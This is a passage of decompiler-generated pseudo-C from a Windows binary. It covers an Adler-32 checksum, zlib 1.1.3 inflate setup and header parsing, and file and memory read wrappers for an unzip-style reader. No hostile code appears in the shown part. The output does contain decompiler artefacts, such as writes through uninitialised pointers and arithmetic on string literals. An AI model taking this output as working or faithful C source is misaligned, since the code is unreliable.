        return 1;
    }
    int32_t v1 = a1 & 0xffff; // 0x4055d1
    int32_t v2 = a1 / 0x10000; // 0x4055d7
    if (a3 == 0) {
        // 0x4056d9
        return 0x10000 * v2 | v1;
    }
    uint32_t v3 = a3;
    uint32_t v4 = v3 >= 0x15b0 ? 0x15b0 : v3;
    int32_t v5 = a2; // 0x405604
    int32_t v6 = v4; // 0x405604
    int32_t v7 = v1; // 0x405604
    int32_t v8 = v2; // 0x405604
    int32_t v9; // 0x4055c4
    int32_t v10; // 0x4055c4
    int32_t v11; // 0x40561b
    int32_t v12; // 0x405623
    int32_t v13; // 0x40562b
    int32_t v14; // 0x405633
    int32_t v15; // 0x40563b
    int32_t v16; // 0x405643
    int32_t v17; // 0x40564b
    int32_t v18; // 0x405653
    int32_t v19; // 0x40565b
    int32_t v20; // 0x405663
    int32_t v21; // 0x40566b
    int32_t v22; // 0x405673
    int32_t v23; // 0x40567b
    int32_t v24; // 0x405683
    int32_t v25; // 0x40568b
    int32_t v26; // 0x40569a
    if (v4 >= 16) {
        // 0x40560a
        v26 = v4 / 16;
        v11 = v1 + (int32_t)*(char *)a2;
        v12 = v11 + (int32_t)*(char *)(a2 + 1);
        v13 = v12 + (int32_t)*(char *)(a2 + 2);
        v14 = v13 + (int32_t)*(char *)(a2 + 3);
        v15 = v14 + (int32_t)*(char *)(a2 + 4);
        v16 = v15 + (int32_t)*(char *)(a2 + 5);
        v17 = v16 + (int32_t)*(char *)(a2 + 6);
        v18 = v17 + (int32_t)*(char *)(a2 + 7);
        v19 = v18 + (int32_t)*(char *)(a2 + 8);
        v20 = v19 + (int32_t)*(char *)(a2 + 9);
        v21 = v20 + (int32_t)*(char *)(a2 + 10);
        v22 = v21 + (int32_t)*(char *)(a2 + 11);
        v23 = v22 + (int32_t)*(char *)(a2 + 12);
        v24 = v23 + (int32_t)*(char *)(a2 + 13);
        v25 = v24 + (int32_t)*(char *)(a2 + 14);
        v7 = v25 + (int32_t)*(char *)(a2 + 15);
        v8 = v11 + v2 + v12 + v13 + v14 + v15 + v16 + v17 + v18 + v19 + v20 + v21 + v22 + v23 + v24 + v25 + v7;
        v5 = a2 + 16;
        v26--;
        v9 = v5;
        v10 = v8;
        while (v26 != 0) {
            // 0x405618
            v11 = v7 + (int32_t)*(char *)v9;
            v12 = v11 + (int32_t)*(char *)(v9 + 1);
            v13 = v12 + (int32_t)*(char *)(v9 + 2);
            v14 = v13 + (int32_t)*(char *)(v9 + 3);
            v15 = v14 + (int32_t)*(char *)(v9 + 4);
            v16 = v15 + (int32_t)*(char *)(v9 + 5);
            v17 = v16 + (int32_t)*(char *)(v9 + 6);
            v18 = v17 + (int32_t)*(char *)(v9 + 7);
            v19 = v18 + (int32_t)*(char *)(v9 + 8);
            v20 = v19 + (int32_t)*(char *)(v9 + 9);
            v21 = v20 + (int32_t)*(char *)(v9 + 10);
            v22 = v21 + (int32_t)*(char *)(v9 + 11);
            v23 = v22 + (int32_t)*(char *)(v9 + 12);
            v24 = v23 + (int32_t)*(char *)(v9 + 13);
            v25 = v24 + (int32_t)*(char *)(v9 + 14);
            v7 = v25 + (int32_t)*(char *)(v9 + 15);
            v8 = v11 + v10 + v12 + v13 + v14 + v15 + v16 + v17 + v18 + v19 + v20 + v21 + v22 + v23 + v24 + v25 + v7;
            v5 = v9 + 16;
            v26--;
            v9 = v5;
            v10 = v8;
        }
        // 0x4056a1
        v6 = v4 & 15;
    }
    int32_t v27 = v5; // 0x4056a3
    int32_t v28 = v6; // 0x4056a3
    int32_t v29 = v7; // 0x4056a3
    int32_t v30 = v8; // 0x4056a3
    int32_t v31 = v5; // 0x4056a3
    int32_t v32 = v7; // 0x4056a3
    int32_t v33 = v8; // 0x4056a3
    int32_t v34; // 0x4056ad
    int32_t v35; // 0x4056a8
    int32_t v36; // 0x4056aa
    int32_t v37; // 0x4056ab
    if (v6 != 0) {
        v35 = v29 + (int32_t)*(char *)v27;
        v36 = v27 + 1;
        v37 = v35 + v30;
        v34 = v28 - 1;
        v27 = v36;
        v28 = v34;
        v29 = v35;
        v30 = v37;
        v31 = v36;
        v32 = v35;
        v33 = v37;
        while (v34 != 0) {
            // 0x4056a5
            v35 = v29 + (int32_t)*(char *)v27;
            v36 = v27 + 1;
            v37 = v35 + v30;
            v34 = v28 - 1;
            v27 = v36;
            v28 = v34;
            v29 = v35;
            v30 = v37;
            v31 = v36;
            v32 = v35;
            v33 = v37;
        }
    }
    int32_t v38 = v3 - v4; // 0x4055fe
    int32_t v39 = v32 % 0xfff1;
    int32_t v40 = v33 % 0xfff1;
    while (v38 != 0) {
        int32_t v41 = v40;
        int32_t v42 = v39;
        int32_t v43 = v31;
        v3 = v38;
        v4 = v3 >= 0x15b0 ? 0x15b0 : v3;
        int32_t v44 = v43; // 0x405604
        v6 = v4;
        int32_t v45 = v42; // 0x405604
        int32_t v46 = v41; // 0x405604
        if (v4 >= 16) {
            // 0x40560a
            v26 = v4 / 16;
            v11 = v42 + (int32_t)*(char *)v43;
            v12 = v11 + (int32_t)*(char *)(v43 + 1);
            v13 = v12 + (int32_t)*(char *)(v43 + 2);
            v14 = v13 + (int32_t)*(char *)(v43 + 3);
            v15 = v14 + (int32_t)*(char *)(v43 + 4);
            v16 = v15 + (int32_t)*(char *)(v43 + 5);
            v17 = v16 + (int32_t)*(char *)(v43 + 6);
            v18 = v17 + (int32_t)*(char *)(v43 + 7);
            v19 = v18 + (int32_t)*(char *)(v43 + 8);
            v20 = v19 + (int32_t)*(char *)(v43 + 9);
            v21 = v20 + (int32_t)*(char *)(v43 + 10);
            v22 = v21 + (int32_t)*(char *)(v43 + 11);
            v23 = v22 + (int32_t)*(char *)(v43 + 12);
            v24 = v23 + (int32_t)*(char *)(v43 + 13);
            v25 = v24 + (int32_t)*(char *)(v43 + 14);
            v7 = v25 + (int32_t)*(char *)(v43 + 15);
            v8 = v11 + v41 + v12 + v13 + v14 + v15 + v16 + v17 + v18 + v19 + v20 + v21 + v22 + v23 + v24 + v25 + v7;
            v5 = v43 + 16;
            v26--;
            v9 = v5;
            v10 = v8;
            while (v26 != 0) {
                // 0x405618
                v11 = v7 + (int32_t)*(char *)v9;
                v12 = v11 + (int32_t)*(char *)(v9 + 1);
                v13 = v12 + (int32_t)*(char *)(v9 + 2);
                v14 = v13 + (int32_t)*(char *)(v9 + 3);
                v15 = v14 + (int32_t)*(char *)(v9 + 4);
                v16 = v15 + (int32_t)*(char *)(v9 + 5);
                v17 = v16 + (int32_t)*(char *)(v9 + 6);
                v18 = v17 + (int32_t)*(char *)(v9 + 7);
                v19 = v18 + (int32_t)*(char *)(v9 + 8);
                v20 = v19 + (int32_t)*(char *)(v9 + 9);
                v21 = v20 + (int32_t)*(char *)(v9 + 10);
                v22 = v21 + (int32_t)*(char *)(v9 + 11);
                v23 = v22 + (int32_t)*(char *)(v9 + 12);
                v24 = v23 + (int32_t)*(char *)(v9 + 13);
                v25 = v24 + (int32_t)*(char *)(v9 + 14);
                v7 = v25 + (int32_t)*(char *)(v9 + 15);
                v8 = v11 + v10 + v12 + v13 + v14 + v15 + v16 + v17 + v18 + v19 + v20 + v21 + v22 + v23 + v24 + v25 + v7;
                v5 = v9 + 16;
                v26--;
                v9 = v5;
                v10 = v8;
            }
            // 0x4056a1
            v44 = v5;
            v6 = v4 & 15;
            v45 = v7;
            v46 = v8;
        }
        // 0x4056a1
        v27 = v44;
        v28 = v6;
        v29 = v45;
        v30 = v46;
        v31 = v44;
        v32 = v45;
        v33 = v46;
        if (v6 != 0) {
            v35 = v29 + (int32_t)*(char *)v27;
            v36 = v27 + 1;
            v37 = v35 + v30;
            v34 = v28 - 1;
            v27 = v36;
            v28 = v34;
            v29 = v35;
            v30 = v37;
            v31 = v36;
            v32 = v35;
            v33 = v37;
            while (v34 != 0) {
                // 0x4056a5
                v35 = v29 + (int32_t)*(char *)v27;
                v36 = v27 + 1;
                v37 = v35 + v30;
                v34 = v28 - 1;
                v27 = v36;
                v28 = v34;
                v29 = v35;
                v30 = v37;
                v31 = v36;
                v32 = v35;
                v33 = v37;
            }
        }
        // 0x4056b0
        v38 = v3 - v4;
        v39 = v32 % 0xfff1;
        v40 = v33 % 0xfff1;
    }
    // 0x4056d9
    return 0x10000 * v40 | v39;
}

// Address range: 0x4056dd - 0x4056ee
int32_t function_4056dd(int32_t nmemb, int32_t size) {
    // 0x4056dd
    return (int32_t)calloc(nmemb, size);
}

// Address range: 0x4056ee - 0x4056fa
void function_4056ee(int32_t * ptr) {
    // 0x4056ee
    free(ptr);
}

// Address range: 0x4056fa - 0x405739
int32_t function_4056fa(int32_t a1) {
    if (a1 == 0) {
        // 0x405735
        return -2;
    }
    int32_t * v1 = (int32_t *)(a1 + 28); // 0x405704
    int32_t v2 = *v1; // 0x405704
    if (v2 == 0) {
        // 0x405735
        return -2;
    }
    // 0x40570b
    *(int32_t *)(a1 + 20) = 0;
    *(int32_t *)(a1 + 8) = 0;
    *(int32_t *)(a1 + 24) = 0;
    *(int32_t *)v2 = *(int32_t *)(v2 + 12) == 0 ? 0 : 7;
    function_4042c0(*(int32_t *)(*v1 + 20), a1, 0);
    return 0;
}

// Address range: 0x405739 - 0x405777
int32_t function_405739(int32_t a1) {
    // 0x405739
    if (a1 == 0) {
        // 0x405772
        return -2;
    }
    int32_t * v1 = (int32_t *)(a1 + 28); // 0x405742
    int32_t v2 = *v1; // 0x405742
    if (v2 == 0 || *(int32_t *)(a1 + 36) == 0) {
        // 0x405772
        return -2;
    }
    int32_t v3 = *(int32_t *)(v2 + 20); // 0x40574f
    if (v3 != 0) {
        // 0x405756
        int32_t v4; // 0x405739
        function_404be5(v3, a1, v4);
    }
    // 0x40575f
    *v1 = 0;
    return 0;
}

// Address range: 0x405777 - 0x40583c
int32_t function_405777(int32_t a1) {
    // 0x405777
    if (a1 == 0) {
        // 0x405839
        return -2;
    }
    int32_t * v1 = (int32_t *)(a1 + 32); // 0x4057a4
    *(int32_t *)(a1 + 24) = 0;
    if (*v1 == 0) {
        // 0x4057ac
        *v1 = 0x4056dd;
        *(int32_t *)(a1 + 40) = 0;
    }
    int32_t * v2 = (int32_t *)(a1 + 36); // 0x4057b6
    if (*v2 == 0) {
        // 0x4057bb
        *v2 = 0x4056ee;
    }
    int32_t * v3 = (int32_t *)(a1 + 28); // 0x4057d1
    *v3 = (int32_t)"1.1.3" & -256 | 49;
    *(int32_t *)(((int32_t)"1.1.3" & -256 | 49) + 20) = 0;
    *(int32_t *)(*v3 + 12) = 0;
    *(int32_t *)(*v3 + 12) = 1;
    *(int32_t *)(*v3 + 16) = 15;
    int32_t v4 = function_40432b(a1, *(int32_t *)(*v3 + 12) == 0 ? 0x4055c4 : 0, 0x8000); // 0x40580b
    *(int32_t *)(*v3 + 20) = v4;
    int32_t result; // 0x405777
    if (*(int32_t *)(*v3 + 20) != 0) {
        // 0x40582c
        function_4056fa(a1);
        result = 0;
    } else {
        // 0x405822
        function_405739(a1);
        result = -4;
    }
    // 0x405839
    return result;
}

// Address range: 0x40583c - 0x405b76
int32_t function_40583c(int32_t a1, int32_t a2) {
    // 0x40583c
    int32_t v1; // bp-16, 0x40583c
    int32_t v2 = &v1; // 0x405844
    if (a1 == 0) {
      lab_0x405b5d:
        // 0x405b5d
        *(int32_t *)(v2 - 4) = -2;
        // 0x405b60
        return -2;
    }
    int32_t * v3 = (int32_t *)(a1 + 28); // 0x40584d
    int32_t v4 = *v3; // 0x40584d
    if (v4 == 0) {
        // 0x405b5d
        *(int32_t *)(v2 - 4) = -2;
        // 0x405b60
        return -2;
    }
    int32_t * v5 = (int32_t *)a1; // 0x405858
    if (*v5 == 0) {
        // 0x405b5d
        *(int32_t *)(v2 - 4) = -2;
        // 0x405b60
        return -2;
    }
    int32_t v6 = a2 != 4 ? 0 : -5;
    int32_t * v7 = (int32_t *)(v2 - 4);
    int32_t * v8 = (int32_t *)(v2 - 8);
    int32_t * v9 = (int32_t *)(v2 - 12);
    int32_t * v10 = (int32_t *)(a1 + 4);
    int32_t * v11 = (int32_t *)(a1 + 8);
    int32_t * v12 = (int32_t *)(a1 + 24);
    int32_t v13 = v4; // 0x405877
    int32_t v14 = -5; // 0x405877
    int32_t v15 = 13; // 0x405877
    int32_t result; // 0x40583c
    int32_t result2; // 0x40583c
    int32_t result3; // 0x40583c
    int32_t result4; // 0x40583c
    int32_t v16; // 0x40583c
    int32_t v17; // 0x40583c
    int32_t v18; // 0x40583c
    int32_t v19; // 0x40583c
    int32_t v20; // 0x40583c
    int32_t v21; // 0x40583c
    int32_t v22; // 0x40583c
    while (true) {
      lab_0x405878:
        // 0x405878
        v22 = v15;
        int32_t v23 = v14;
        int32_t v24 = v13;
        int32_t v25 = *(int32_t *)v24;
        g52 = v25;
        v17 = v23;
        v18 = v23;
        v19 = v23;
        v20 = v23;
        v21 = v23;
        result2 = v23;
        result3 = v23;
        result4 = v23;
        v16 = v23;
        switch (v25) {
            case 0: {
                int32_t v26 = *v10; // 0x405887
                result = v23;
                if (v26 == 0) {
                    // 0x405b60
                    return result;
                }
                // 0x405892
                *v11 = *v11 + 1;
                *v10 = v26 - 1;
                *(int32_t *)(v24 + 4) = (int32_t)*(char *)*v5;
                int32_t v27 = *v3; // 0x4058a4
                int32_t * v28 = (int32_t *)(v27 + 4); // 0x4058a7
                *v5 = *v5 + 1;
                if ((*v28 & 15) == 8) {
                    // 0x4058c2
                    if (*v28 / 16 + 8 > *(int32_t *)(v27 + 16)) {
                        // 0x4058d0
                        int32_t * v29; // 0x40583c
                        *v29 = v22;
                        *v12 = (int32_t)"invalid window size";
                        goto lab_0x405a73;
                    } else {
                        // 0x4058de
                        *(int32_t *)v27 = 1;
                        v17 = v6;
                        goto lab_0x405b5d;
                    }
                } else {
                    // 0x4058b4
                    *(int32_t *)v27 = v22;
                    *v12 = (int32_t)"unknown compression method";
                    goto lab_0x405a73;
                }
            }
            case 1: {
                goto lab_0x405b5d;
            }
            case 2: {
                goto lab_0x405a9a;
            }
            case 3: {
                goto lab_0x405ac4;
            }
            case 4: {
                goto lab_0x405aee;
            }
            case 5: {
                goto lab_0x405b18;
            }
            case 6: {
                // 0x405b4a
                *(int32_t *)*v3 = v22;
                *v12 = (int32_t)"need dictionary";
                *(int32_t *)(*v3 + 4) = 0;
                // 0x405b5d
                *(int32_t *)(v2 - 4) = -2;
                // 0x405b60
                return -2;
            }
            case 7: {
                // 0x405952
                *v7 = v23;
                *v8 = a1;
                *v9 = *(int32_t *)(v24 + 20);
                int32_t v30 = function_4043b6((int32_t)&g54, (int32_t)&g54); // 0x405957
                if (v30 != -3) {
                    int32_t v31 = v30 != 0 ? v30 : v6;
                    result = v31;
                    if (v31 != 1) {
                        // 0x405b60
                        return result;
                    }
                    int32_t v32 = *v3; // 0x405987
                    *v7 = v32 + 4;
                    *v8 = a1;
                    *v9 = *(int32_t *)(v32 + 20);
                    function_4042c0((int32_t)&g54, (int32_t)&g54, (int32_t)&g54);
                    int32_t v33 = *v3; // 0x40599a
                    int32_t * v34 = (int32_t *)v33;
                    if (*(int32_t *)(v33 + 12) == 0) {
                        // 0x4059b1
                        *v34 = 8;
                        v18 = v6;
                        goto lab_0x4059b7;
                    } else {
                        // 0x4059a6
                        *v34 = 12;
                        v14 = v6;
                        v15 = v22;
                        goto lab_0x405a7d;
                    }
                } else {
                    // 0x405966
                    *(int32_t *)*v3 = v22;
                    *(int32_t *)(*v3 + 4) = 0;
                    v14 = v30;
                    v15 = v22;
                    goto lab_0x405a7d;
                }
            }
            case 8: {
                goto lab_0x4059b7;
            }
            case 9: {
                goto lab_0x4059e5;
            }
            case 10: {
                goto lab_0x405a13;
            }
            case 11: {
                goto lab_0x405a3d;
            }
            case 12: {
                goto lab_0x405b6e;
            }
            case 13: {
                // 0x405b72
                *v7 = -3;
                // 0x405b60
                return -3;
            }
            default: {
                goto lab_0x405b5d;
            }
        }
    }
  lab_0x405b5d:;
    int32_t v35 = *v10; // 0x4058e4
    result = v17;
    if (v35 == 0) {
        // 0x405b60
        return result;
    }
    // 0x4058ef
    *v11 = *v11 + 1;
    *v10 = v35 - 1;
    int32_t v36 = *v5; // 0x4058f9
    int32_t v37 = *v3; // 0x4058fe
    *v7 = 31;
    int32_t v38 = (int32_t)*(char *)v36; // 0x405903
    *v5 = v36 + 1;
    if ((256 * *(int32_t *)(v37 + 4) | v38) % *v7 == 0) {
        if ((v38 & 32) != 0) {
            // 0x405a8e
            *(int32_t *)*v3 = 2;
            result2 = v6;
            goto lab_0x405a9a;
        }
        // 0x405941
        *v7 = 13;
        *(int32_t *)v37 = 7;
        v14 = v6;
        v15 = *v7;
    } else {
        // 0x40591a
        *v7 = 13;
        *(int32_t *)v37 = 13;
        *v12 = (int32_t)"incorrect header check";
        *(int32_t *)(*v3 + 4) = 5;
        v14 = v6;
        v15 = 13;
    }
    goto lab_0x405a7d;
  lab_0x405a9a:;
    int32_t v39 = *v10; // 0x405a9a
    if (v39 == 0) {
        // 0x405b60
        return result2;
    }
    // 0x405aa1
    *v11 = *v11 + 1;
    *v10 = v39 - 1;
    *(int32_t *)(*v3 + 8) = 0x1000000 * (int32_t)*(char *)*v5;
    *v5 = *v5 + 1;
    *(int32_t *)*v3 = 3;
    result3 = v6;
    goto lab_0x405ac4;
  lab_0x405ac4:;
    int32_t v40 = *v10; // 0x405ac4
    if (v40 == 0) {
        // 0x405b60
        return result3;
    }
    // 0x405acb
    *v11 = *v11 + 1;
    *v10 = v40 - 1;
    int32_t * v41 = (int32_t *)(*v3 + 8); // 0x405ae0
    *v41 = *v41 + 0x10000 * (int32_t)*(char *)*v5;
    *v5 = *v5 + 1;
    *(int32_t *)*v3 = 4;
    result4 = v6;
    goto lab_0x405aee;
  lab_0x405aee:;
    int32_t v42 = *v10; // 0x405aee
    if (v42 == 0) {
        // 0x405b60
        return result4;
    }
    // 0x405af5
    *v11 = *v11 + 1;
    *v10 = v42 - 1;
    int32_t * v43 = (int32_t *)(*v3 + 8); // 0x405b0a
    *v43 = *v43 + 256 * (int32_t)*(char *)*v5;
    *v5 = *v5 + 1;
    *(int32_t *)*v3 = 5;
    v16 = v6;
    goto lab_0x405b18;
  lab_0x405b18:;
    int32_t v44 = *v10; // 0x405b18
    result = v16;
    if (v44 != 0) {
        // 0x405b23
        *v11 = *v11 + 1;
        *v10 = v44 - 1;
        *v7 = 2;
        int32_t * v45 = (int32_t *)(*v3 + 8); // 0x405b34
        *v45 = *v45 + (int32_t)*(char *)*v5;
        int32_t v46 = *v3; // 0x405b37
        *v5 = *v5 + 1;
        *(int32_t *)(a1 + 48) = *(int32_t *)(v46 + 8);
        *(int32_t *)v46 = 6;
        result = *v7;
    }
    // 0x405b60
    return result;
  lab_0x4059b7:;
    int32_t v47 = *v10; // 0x4059b7
    result = v18;
    if (v47 == 0) {
        // 0x405b60
        return result;
    }
    // 0x4059c2
    *v11 = *v11 + 1;
    *v10 = v47 - 1;
    *(int32_t *)(*v3 + 8) = 0x1000000 * (int32_t)*(char *)*v5;
    *v5 = *v5 + 1;
    *(int32_t *)*v3 = 9;
    v19 = v6;
    goto lab_0x4059e5;
  lab_0x4059e5:;
    int32_t v48 = *v10; // 0x4059e5
    result = v19;
    if (v48 == 0) {
        // 0x405b60
        return result;
    }
    // 0x4059f0
    *v11 = *v11 + 1;
    *v10 = v48 - 1;
    int32_t * v49 = (int32_t *)(*v3 + 8); // 0x405a05
    *v49 = *v49 + 0x10000 * (int32_t)*(char *)*v5;
    *v5 = *v5 + 1;
    *(int32_t *)*v3 = 10;
    v20 = v6;
    goto lab_0x405a13;
  lab_0x405a13:;
    int32_t v50 = *v10; // 0x405a13
    result = v20;
    if (v50 == 0) {
        // 0x405b60
        return result;
    }
    // 0x405a1a
    *v11 = *v11 + 1;
    *v10 = v50 - 1;
    int32_t * v51 = (int32_t *)(*v3 + 8); // 0x405a2f
    *v51 = *v51 + 256 * (int32_t)*(char *)*v5;
    *v5 = *v5 + 1;
    *(int32_t *)*v3 = 11;
    v21 = v6;
    goto lab_0x405a3d;
  lab_0x405a3d:;
    int32_t v52 = *v10; // 0x405a3d
    result = v21;
    if (v52 == 0) {
        // 0x405b60
        return result;
    }
    // 0x405a44
    *v11 = *v11 + 1;
    *v10 = v52 - 1;
    int32_t * v53 = (int32_t *)(*v3 + 8); // 0x405a56
    *v53 = *v53 + (int32_t)*(char *)*v5;
    int32_t v54 = *v3; // 0x405a59
    *v5 = *v5 + 1;
    if (*(int32_t *)(v54 + 4) == *(int32_t *)(v54 + 8)) {
        // 0x405b65
        *(int32_t *)*v3 = 12;
        goto lab_0x405b6e;
    }
    // 0x405a6a
    *(int32_t *)v54 = v22;
    *v12 = (int32_t)"incorrect data check";
    goto lab_0x405a73;
  lab_0x405b6e:
    // 0x405b6e
    *v7 = 1;
    // 0x405b60
    return 1;
  lab_0x405a7d:
    // 0x405a7d
    v13 = *v3;
    goto lab_0x405878;
  lab_0x405a73:
    // 0x405a73
    *(int32_t *)(*v3 + 4) = 5;
    v14 = v6;
    v15 = v22;
    goto lab_0x405a7d;
}

// Address range: 0x405bae - 0x405c9f
int32_t function_405bae(int32_t lpFileName, int32_t a2, int32_t a3, int32_t a4) {
    uint32_t v1 = a3 - 1;
    if (v1 >= 3) {
        // 0x405bc7
        *(int32_t *)a4 = 0x10000;
        // 0x405c9a
        return 0;
    }
    // 0x405bd2
    int32_t v2; // bp-20, 0x405bae
    int32_t v3 = &v2; // 0x405bba
    int32_t * v4 = (int32_t *)a4; // 0x405bdf
    *v4 = 0;
    int32_t v5 = v3; // 0x405be4
    int32_t v6 = lpFileName; // 0x405be4
    int32_t * hFile = NULL; // 0x405be4
    int32_t v7; // 0x405bae
    int32_t v8; // 0x405bae
    int32_t * v9; // 0x405bae
    char v10; // 0x405bae
    if (a3 == 1) {
        goto lab_0x405c24;
    } else {
        // 0x405be6
        v9 = NULL;
        v10 = 0;
        v8 = v3;
        v7 = 0;
        if (a3 != 2) {
            goto lab_0x405c36;
        } else {
            int32_t v11 = lpFileName; // bp-48, 0x405bfb
            int32_t * fileHandle = CreateFileA((char *)lpFileName, -0x80000000, 1, NULL, 3, 128, NULL); // 0x405bfe
            v5 = &v11;
            v6 = (int32_t)fileHandle;
            hFile = (int32_t *)1;
            if (fileHandle == (int32_t *)-1) {
                // 0x405c0b
                *v4 = 512;
                // 0x405c9a
                return 0;
            }
            goto lab_0x405c24;
        }
    }
  lab_0x405c24:
    // 0x405c24
    *(int32_t *)(v5 - 4) = 1;
    *(int32_t *)(v5 - 8) = 0;
    *(int32_t *)(v5 - 12) = 0;
    int32_t v12 = v5 - 16; // 0x405c28
    *(int32_t *)v12 = v6;
    int32_t v13 = SetFilePointer(hFile, (int32_t)&g54, &g54, (int32_t)&g54); // 0x405c29
    v9 = hFile;
    v10 = v13 != -1;
    v8 = v12;
    v7 = v6;
    goto lab_0x405c36;
  lab_0x405c36:;
    int32_t * v14 = (int32_t *)(v8 - 4); // 0x405c36
    *v14 = 32;
    int32_t result = _3f__3f_2_40_YAPAXI_40_Z((int32_t)v10); // 0x405c38
    if (v1 < 2) {
        // 0x405c69
        *(char *)result = 1;
        *(char *)(result + 16) = (char)(int32_t)v9;
        *(char *)(result + 1) = v10;
        *(int32_t *)(result + 4) = v7;
        *(char *)(result + 8) = 0;
        int32_t * v15 = (int32_t *)(result + 12); // 0x405c80
        *v15 = 0;
        if (v10 != 0) {
            // 0x405c85
            *v14 = 1;
            *(int32_t *)(v8 - 8) = 0;
            *(int32_t *)(v8 - 12) = 0;
            *(int32_t *)(v8 - 16) = v7;
            *v15 = SetFilePointer(&g54, (int32_t)&g54, &g54, (int32_t)&g54);
        }
    } else {
        // 0x405c4c
        *(char *)result = 0;
        *(int32_t *)(result + 20) = lpFileName;
        *(char *)(result + 1) = 1;
        *(char *)(result + 16) = 0;
        *(int32_t *)(result + 24) = a2;
        *(int32_t *)(result + 28) = 0;
        *(int32_t *)(result + 12) = 0;
    }
    // 0x405c93
    *v4 = 0;
    // 0x405c9a
    return result;
}

// Address range: 0x405c9f - 0x405cc7
int32_t function_405c9f(int32_t a1) {
    if (a1 == 0) {
        // 0x405ca8
        return -1;
    }
    // 0x405cad
    int32_t v1; // bp-4, 0x405c9f
    int32_t * v2 = &v1; // 0x405cb1
    if (*(char *)(a1 + 16) != 0) {
        int32_t hObject = *(int32_t *)(a1 + 4); // 0x405cb3
        int32_t v3 = hObject; // bp-8, 0x405cb3
        CloseHandle((int32_t *)hObject);
        v2 = &v3;
    }
    // 0x405cbc
    *(int32_t *)((int32_t)v2 - 4) = a1;
    _3f__3f_3_40_YAXPAX_40_Z(&g54);
    return 0;
}

// Address range: 0x405cc7 - 0x405cdd
int32_t function_405cc7(int32_t a1) {
    // 0x405cc7
    if (*(char *)a1 != 0) {
        // 0x405cd0
        if (*(char *)(a1 + 8) != 0) {
            // 0x405cd6
            return 1;
        }
    }
    // 0x405cd6
    return 0;
}

// Address range: 0x405cdd - 0x405d0e
int32_t function_405cdd(int32_t a1) {
    // 0x405cdd
    if (*(char *)a1 == 0) {
        // 0x405d09
        return *(int32_t *)(a1 + 28);
    }
    // 0x405cea
    if (*(char *)(a1 + 1) == 0) {
        // 0x405d05
        return 0;
    }
    int32_t v1 = SetFilePointer((int32_t *)*(int32_t *)(a1 + 4), 0, NULL, 1); // 0x405cf6
    return v1 - *(int32_t *)(a1 + 12);
}

// Address range: 0x405d0e - 0x405d8a
int32_t function_405d0e(int32_t a1, int32_t a2, int32_t a3) {
    // 0x405d0e
    if (*(char *)a1 == 0) {
        // 0x405d5f
        if (a3 == 0) {
            // 0x405d83
            *(int32_t *)(a1 + 28) = a2;
            // 0x405d54
            return 0;
        }
        if (a3 == 1) {
            int32_t * v1 = (int32_t *)(a1 + 28); // 0x405d72
            *v1 = *v1 + a2;
            // 0x405d54
            return 0;
        }
        // 0x405d77
        if (a3 != 2) {
            // 0x405d54
            return 0;
        }
        // 0x405d83
        *(int32_t *)(a1 + 28) = *(int32_t *)(a1 + 24) + a2;
        // 0x405d54
        return 0;
    }
    // 0x405d1c
    if (*(char *)(a1 + 1) == 0) {
        // 0x405d54
        return 29;
    }
    int32_t dwMoveMethod; // 0x405d0e
    int32_t lDistanceToMove; // 0x405d0e
    if (a3 != 0) {
        // 0x405d31
        dwMoveMethod = 1;
        lDistanceToMove = a2;
        if (a3 != 1) {
            // 0x405d3b
            dwMoveMethod = 2;
            lDistanceToMove = a2;
            if (a3 != 2) {
                // 0x405d54
                return 19;
            }
        }
    } else {
        // 0x405d26
        dwMoveMethod = 0;
        lDistanceToMove = *(int32_t *)(a1 + 12) + a2;
    }
    int32_t hFile = *(int32_t *)(a1 + 4); // 0x405d47
    SetFilePointer((int32_t *)hFile, lDistanceToMove, NULL, dwMoveMethod);
    // 0x405d54
    return 0;
}

// Address range: 0x405d8a - 0x405def
int32_t function_405d8a(int32_t * lpBuffer, uint32_t a2, int32_t a3, int32_t a4) {
    int32_t lpNumberOfBytesRead = (int32_t)lpBuffer;
    int32_t nNumberOfBytesToRead = a3 * a2; // 0x405d95
    if (*(char *)a4 != 0) {
        // 0x405d9e
        if (!ReadFile((int32_t *)*(int32_t *)(a4 + 4), lpBuffer, nNumberOfBytesToRead, &lpNumberOfBytesRead, NULL)) {
            // 0x405db5
            *(char *)(a4 + 8) = 1;
        }
        // 0x405de6
        return lpNumberOfBytesRead / a2;
    }
    int32_t * v1 = (int32_t *)(a4 + 28); // 0x405dbe
    int32_t v2 = *v1; // 0x405dbe
    uint32_t v3 = *(int32_t *)(a4 + 24); // 0x405dc1
    int32_t v4 = v2 + nNumberOfBytesToRead > v3 ? v3 - v2 : nNumberOfBytesToRead;
    memcpy(lpBuffer, (int32_t *)(*(int32_t *)(a4 + 20) + v2), v4);
    *v1 = *v1 + v4;
    // 0x405de6
    return v4 / a2;
}

// Address range: 0x405def - 0x405e27
int32_t function_405def(int32_t a1, int32_t * a2) {
    // 0x405def
    int32_t v1; // bp-5, 0x405def
    if (function_405d8a(&v1, 1, 1, a1) != 1) {
        // 0x405e18
        return function_405cc7(a1) != 0;
    }
    // 0x405e0b
    *a2 = v1 & 255;
    return 0;
}

// Address range: 0x405e27 - 0x405e6b
int32_t function_405e27(int32_t a1, int32_t * a2) {
    // 0x405e27
    int32_t v1; // bp-8, 0x405e27
    int32_t result = function_405def(a1, &v1); // 0x405e33
    if (result != 0) {
        // 0x405e68
        *a2 = 0;
        return result;
    }
    int32_t result2 = function_405def(a1, &v1); // 0x405e48
    int32_t v2 = 0; // 0x405e51
    if (result2 == 0) {
        // 0x405e53
        v2 = 256 * v1 + v1;
    }
    // 0x405e68
    *a2 = v2;
    return result2;
}

// Address range: 0x405e6b - 0x405edf
int32_t function_405e6b(int32_t a1, int32_t * a2) {
    int32_t v1 = a1;
    int32_t v2 = function_405def(a1, &v1); // 0x405e78
    int32_t v3 = v1; // 0x405e7d
    v1 = v3;
    int32_t v4 = v2; // 0x405e84
    if (v2 == 0) {
        // 0x405e86
        v4 = function_405def(a1, &v1);
    }
    int32_t v5 = v1; // 0x405e92
    v1 = v5;
    int32_t result = v4; // 0x405e9c
    if (v4 == 0) {
        // 0x405e9e
        result = function_405def(a1, &v1);
    }
    // 0x405eaa
    if (result != 0) {
        // 0x405edb
        *a2 = 0;
        return result;
    }
    int32_t result2 = function_405def(a1, &v1); // 0x405ebb
    int32_t v6 = 0; // 0x405ec4
    if (result2 == 0) {
        // 0x405ec6
        v6 = 256 * v5 + v3 + 0x10000 * v1 + 0x1000000 * v1;
    }
    // 0x405edb
    *a2 = v6;
    return result2;
}

// Address range: 0x405edf - 0x405fe2
int32_t function_405edf(int32_t a1) {
    int32_t v1 = 2; // bp-32, 0x405ee7
